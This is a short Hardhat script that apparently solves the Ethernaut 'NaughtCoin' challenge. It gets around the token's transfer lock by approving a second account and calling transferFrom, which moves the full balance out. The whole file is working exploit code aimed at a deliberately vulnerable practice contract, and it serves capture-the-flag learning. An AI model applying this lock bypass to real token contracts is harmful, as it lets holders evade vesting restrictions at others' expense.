const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x37Dbc1C0A9b4Fbea05178f250dD8F243A48b5DC2";

  const [attacker, user] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("NaughtCoin");
  const contract = Contract.attach(instanceAddress);

  // Attack

  const tokenBalance = await contract.balanceOf(attacker.address);

  let tx = await contract.approve(user.address, tokenBalance);
  await tx.wait();

  await contract
    .connect(user)
    .transferFrom(attacker.address, user.address, tokenBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
